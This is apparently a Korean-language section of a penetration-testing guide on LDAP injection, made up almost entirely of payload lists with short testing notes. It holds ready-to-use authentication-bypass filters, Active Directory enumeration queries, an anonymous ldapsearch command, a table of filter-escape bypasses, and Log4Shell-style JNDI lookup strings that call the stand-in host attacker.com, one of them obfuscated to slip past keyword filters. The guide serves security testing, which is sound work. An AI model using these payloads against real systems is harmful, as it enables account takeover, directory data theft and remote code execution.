### Phase 2: 동적 테스트 (검증)

**기본 페이로드:**

**인증 우회** (`AUTH_BYPASS` 라벨):
- `admin)(|(uid=*` (username)
- `*)(uid=*))(|(uid=*` (username)
- `admin)(&(password=*)` (username)
- `*)(&)` (username — 항상 참)
- `admin)(!(uid=admin)` (username — admin 제외 모든 사용자)

**Password 와일드카드:**
- `*` (password — 모든 password 매칭)
- `admin)(uid=*))(|(uid=*` + 임의 password
- `*)(uid=*))(&(uid=admin)(password=*` (password)

**JSON body:**
```json
{"username":"admin)(|(uid=*","password":"x"}
{"username":"admin)(&)","password":"x"}
{"username":"admin","password":"*"}
```

**정보 유출:**
- `*` (모든 매칭)
- `admin)(|(uid=*)` (전체 사용자)
- `(objectClass=*)` (모든 객체)
- `(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com)` (admin group)
- `(userAccountControl:1.2.840.113556.1.4.803:=2)` (비활성 계정 — AD)
- `(userAccountControl:1.2.840.113556.1.4.803:=8192)` (Domain Controller)

**Blind extraction (Boolean):**
```
# 첫 글자 추측
admin*&password=*    → 매치되면 admin*로 시작하는 사용자 존재
admin a*&password=*  → admin a로 시작 확인

# substring
(cn=admin*)(memberOf=*Admin*)
```

**DN injection** (`DN_INJECTION` 라벨):
```
cn=evil,ou=people\,dc=target,dc=com
cn=user,ou=admin\,ou=people,dc=x
```

**JNDI lookup (Log4Shell 변형, `JNDI_LOOKUP` 라벨):**
- `${jndi:ldap://attacker.com/Exploit}` (User-Agent / 임의 입력)
- `${jndi:ldaps://attacker.com/x}`
- `${jndi:rmi://attacker.com/x}`
- `${jndi:dns://attacker.com/x}`
- `${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/x}` (필터 우회)

**Attribute injection** (`ATTR_INJECTION` 라벨):
```
?attrs=userPassword,memberOf,objectClass
?attrs=*  (모든 속성 노출)
```

**Anonymous bind 시도:**
```
# bind DN/password 없이 검색 가능 시 익명 검색
ldapsearch -h target -x -b "dc=target,dc=com" "(objectClass=*)"
```

---

**우회 페이로드:**

| 방어 | 페이로드 |
|---|---|
| `(`, `)` 만 escape | `\` (백슬래시), `*` (와일드카드), `\0` (NUL) 누락 시 — `*` 단독으로 매칭 |
| 화이트리스트 (영문/숫자) | username 단일 `*` (와일드카드만) |
| DN escape만 적용 | 검색 필터에 같은 입력 쓰이면 우회 |
| Filter 객체 API + 일부 raw concat | 모든 필터 위치 검증 — group/role/OU 별도 |
| `userAccountControl` bit 차단 | LDAP matching rule `:1.2.840.113556.1.4.803:` (AD bitwise AND) |
| Anonymous bind 차단 | bind DN 약한 자격증명 brute force, default credentials |
| Referral chasing 차단 | 외부 LDAP 가리키는 alias |

**Hex/Unicode escape 우회:**
```
# 일부 서버가 \HH escape 디코딩
admin\29\28\7C\28uid\3D\2A    (= admin)(|(uid=*)
admin\u0029\u0028\u007C       (Unicode)
```

---

**참고사항:**

- 로그인 폼이 가장 흔한 sink — username/password 양쪽 시도
- AD 환경에선 `userAccountControl` bit 검사 우회로 비활성 계정 로그인 가능
- JNDI lookup은 Java 환경에서 RCE 게이트 (Log4Shell 변형) — 별도 영향도
- Anonymous bind 활성화는 정보 노출만으로도 심각 — bind 후 익명 검색 시도
- AD `Domain Admins` 그룹 매칭으로 권한 확인 — `(memberOf=CN=Domain Admins,...)`
- LDAP referral chasing 활성 시 외부 LDAP 서버로 요청 → SSRF 변형
- 응답에 LDAP raw 메시지 노출 시 schema/attribute 정보 추가 누설
- 인증 우회 검증은 다중 시나리오로 (admin/일반/존재 안 하는 사용자) 비교
- Java JNDI lookup은 `${jndi:...}` 형태 — log4j2 < 2.17.0, 로깅 외 다양한 sink
- `${${::-j}${::-n}${::-d}${::-i}:...}` 형태로 필터 우회 — 키워드 분할
- LDAP filter syntax는 RFC 4515 — `\HH` escape는 표준이나 일부 서버만 지원
- LDAP search base가 너무 넓으면 (`dc=com`) enumeration 영향도 큼
- bind credential을 환경변수/secret manager 외 코드에 하드코딩 시 별도 영향
